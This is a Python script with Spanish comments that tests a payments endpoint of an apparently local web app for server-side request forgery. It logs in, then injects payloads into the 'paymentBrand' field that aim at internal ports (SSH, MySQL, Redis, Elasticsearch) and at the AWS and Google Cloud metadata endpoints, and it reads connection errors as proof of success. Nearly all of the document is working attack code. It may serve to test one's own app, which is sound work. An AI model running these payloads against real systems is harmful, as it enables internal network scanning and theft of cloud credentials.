#!/usr/bin/env python3
"""
Script para probar vulnerabilidad SSRF en el endpoint de pagos
Uso: python3 test_ssrf.py
"""

import requests
import json
import sys

# Configuración
BASE_URL = "http://localhost:5000"
USERNAME = "test"
PASSWORD = "password"

def login():
    """Obtener token de autenticación"""
    url = f"{BASE_URL}/auth/login"
    data = {"username": USERNAME, "password": PASSWORD}
    
    try:
        response = requests.post(url, json=data)
        if response.status_code == 200:
            return response.json()["token"]
        else:
            print(f"Error en login: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error de conexión: {e}")
        return None

def test_ssrf(token, payment_brand, description):
    """Probar un payload SSRF específico"""
    url = f"{BASE_URL}/invoices/test-invoice/pay"
    headers = {"Authorization": f"Bearer {token}"}
    data = {
        "paymentBrand": payment_brand,
        "ccNumber": "4111111111111111",
        "ccv": "123",
        "expirationDate": "12/25"
    }
    
    print(f"\nProbando: {description}")
    print(f"Target: {payment_brand}")
    
    try:
        response = requests.post(url, json=data, headers=headers, timeout=5)
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            print("✅ Conexión exitosa - Vulnerabilidad confirmada")
        elif "ECONNREFUSED" in str(response.text):
            print("⚠️  Servicio cerrado, pero SSRF funciona")
        elif "ENOTFOUND" in str(response.text):
            print("⚠️  Host no encontrado, pero SSRF funciona")
        elif "ETIMEDOUT" in str(response.text):
            print("⚠️  Timeout, pero SSRF funciona")
        else:
            print(f"Respuesta: {response.text[:200]}")
            
    except requests.exceptions.Timeout:
        print("⏰ Timeout - Posible SSRF (servicio lento)")
    except Exception as e:
        print(f"❌ Error: {e}")

def main():
    print("🔍 Probando vulnerabilidad SSRF...")
    
    # Obtener token
    token = login()
    if not token:
        print("❌ No se pudo obtener token de autenticación")
        sys.exit(1)
    
    print("✅ Token obtenido")
    
    # Payloads de prueba
    payloads = [
        ("localhost:22", "Puerto SSH"),
        ("localhost:3306", "Puerto MySQL"),
        ("localhost:6379", "Puerto Redis"),
        ("localhost:9200", "Puerto Elasticsearch"),
        ("127.0.0.1:22", "SSH con IP local"),
        ("0.0.0.0:22", "SSH con IP wildcard"),
        ("169.254.169.254/latest/meta-data/", "AWS Metadata"),
        ("metadata.google.internal/computeMetadata/v1/", "Google Cloud Metadata"),
        ("localhost:3000", "Aplicación local"),
        ("localhost:5000", "Backend local")
    ]
    
    for payment_brand, description in payloads:
        test_ssrf(token, payment_brand, description)
    
    print("\n🎯 Prueba completada")
    print("Si ves 'Conexión exitosa' o mensajes de error específicos,")
    print("la vulnerabilidad SSRF está confirmada.")

if __name__ == "__main__":
    main()
